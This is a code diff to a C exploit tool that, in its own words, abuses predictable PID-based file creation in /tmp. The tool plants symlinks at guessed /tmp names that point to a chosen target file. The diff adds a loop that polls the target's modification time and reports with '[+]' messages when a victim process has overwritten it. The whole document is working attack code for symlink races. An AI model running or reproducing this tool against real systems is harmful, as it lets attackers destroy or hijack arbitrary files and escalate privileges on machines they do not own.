@@ -3,6 +3,8 @@
 #include <unistd.h>
 #include <errno.h>
 #include <string.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 
 
 /*symlink creator to abuse files creation in /tmp where the pid is used
@@ -13,22 +15,18 @@ and a filename to link from and a filename to link to.
 Add monitoring of writes to linked files?
 */
 
-typedef struct _file_info {
-
-struct _file_info *next;
-char filename[256];
-
-} file_info;
-
 extern int errno;
 
 int
 main (int argc, char **argv)
 {
 
-  int x = 0, from = 0, to = 0, result = 0;
+  int x = 0, from = 0, to = 0, result = 0, i = 0;
   char dest_name[256];
   char from_name[256];
+  struct stat buf;
+  time_t t_time_watch,t_time;
+  char start_time[26];
 
 
   from = getpid ();
@@ -45,15 +43,23 @@ main (int argc, char **argv)
   to = atoi (argv[1]);
   to = from + to;
 
-  printf ("Starting from %d\n", from);
+  printf ("Starting from our own process id: %d\n", from);
 
+  snprintf (dest_name,256, "%s", argv[3]);
+  i= stat (dest_name, &buf);
+  if (i < 0) {
+printf("ERROR with stat() on %s",dest_name);
+return(-1);
+}
+
+  t_time = buf.st_mtim.tv_sec;
+  snprintf(start_time,25,"%s",ctime(&t_time));
+
+   t_time_watch = buf.st_mtim.tv_sec;
   for (x = from; x <= to; x++)
     {
-      sprintf (dest_name, "%s", argv[3]);
       sprintf (from_name, "/tmp/%s%d", argv[2], x);
-
       printf ("Symlinking %s->%s\n", from_name, dest_name);
-
       result = symlink (dest_name, from_name);
 
       if (result < 0)
@@ -64,6 +70,20 @@ main (int argc, char **argv)
 	}
 
     }
+
+while (t_time == t_time_watch) {
+
+ i = stat (dest_name, &buf);
+ t_time_watch = buf.st_mtim.tv_sec;
+
+}
+
+if (t_time != t_time_watch) {
+ 
+printf("[+] The target file %s has been over written!\n", dest_name);
+printf("[+] Modification time changed from %s to %s\n",start_time,ctime(&t_time_watch));
+
+}
 
   return (0);
 }
